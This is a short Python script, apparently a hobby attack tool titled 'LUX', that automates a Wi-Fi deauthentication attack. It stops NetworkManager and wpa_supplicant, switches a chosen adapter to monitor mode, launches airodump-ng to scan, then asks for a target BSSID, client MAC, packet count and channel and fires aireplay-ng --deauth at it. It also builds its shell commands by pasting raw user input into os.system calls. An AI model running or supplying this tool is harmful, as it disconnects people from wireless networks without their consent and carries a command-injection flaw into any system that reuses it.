import os

print ("""

██╗     ██╗   ██╗██╗  ██╗
██║     ██║   ██║╚██╗██╔╝
██║     ██║   ██║ ╚███╔╝ 
██║     ██║   ██║ ██╔██╗ 
███████╗╚██████╔╝██╔╝ ██╗
╚══════╝ ╚═════╝ ╚═╝  ╚═╝

""")

print("ADMINISTRATIVE PERMISSIONS NEEDED \n")
#print("Enter the adapters to use for package injection and scanning:")

os.system("    sudo ifconfig | grep -E '^[a-zA-Z0-9]+:'")
tbssid=[]
cmac=[]
channel=[]
adap=str(input("Enter the adapters to use for package injection and scanning:"))
os.system("""
   echo "Stopping NetworkManager and wpa_supplicant..."
    sudo systemctl stop NetworkManager
    sudo systemctl stop wpa_supplicant

    echo  "Setting up adapter $adapter in monitor mode..."
    sudo ip link set """ + adap+ """ down
    sudo iw dev """ + adap+ """ set type monitor
    sudo ip link set """ + adap+ """ up
""")

print("Scanning on "+adap+"....")
os.system("gnome-terminal -- bash -c 'sudo airodump-ng '"+adap)
print("")

networkc=str(input("Enter the target BSSID: "))
mac=str(input("Enter the client mac (leave blank for all): "))
pkta=str(input("Enter the number of packets: "))
ps=str(input("Number of packets per second: "))
c=str(input("Enter the channel number: "))
os.system("sudo iwconfig "+adap + " channel "+c)
if mac=="" :
    os.system("sudo aireplay-ng --deauth "+pkta+" "+" -x "+ ps + " -a "+networkc+" "+ adap)
else:
    os.system("sudo aireplay-ng --deauth "+pkta+" "+" -x "+ ps + " -a "+networkc+ " -c "+ mac + " " + adap)
    

